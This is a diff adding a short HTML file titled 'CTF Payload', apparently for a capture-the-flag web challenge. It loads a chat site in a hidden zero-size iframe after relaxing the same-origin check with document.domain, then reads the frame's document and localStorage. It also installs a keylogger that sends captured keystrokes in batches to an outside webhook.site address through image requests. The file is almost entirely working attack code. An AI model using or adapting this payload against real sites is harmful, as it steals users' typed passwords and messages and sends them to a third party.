@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF Payload</title>
+</head>
+<body>
+
+<h3>Loading…</h3>
+
+<iframe
+  id="chatFrame"
+  src="https://chat.owley-madison.jeopardy.websec.saarland/"
+  style="width:0;height:0;border:0;">
+</iframe>
+
+<script>
+document.domain = "websec.saarland";
+const frame = document.getElementById("chatFrame");
+
+frame.onload = () => {
+  try {
+    const chatDoc = frame.contentWindow.document;
+
+    console.log("[+] iframe accessed");
+    console.log("[+] title:", chatDoc.title);
+
+    const ls = frame.contentWindow.localStorage;
+    console.log("[+] localStorage keys:", Object.keys(ls));
+
+
+  let d = "";
+
+  chatDoc.addEventListener("keydown", (e) => {
+    d += e.key;
+
+    if (d.length > 5) {
+      new Image().src =
+        "https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" +
+        encodeURIComponent(d);
+
+      d = "";
+    }
+  });   
+
+  } catch (e) {
+    console.error("Access failed:", e);
+  }
+};
+</script>
+
+</body>
+</html>
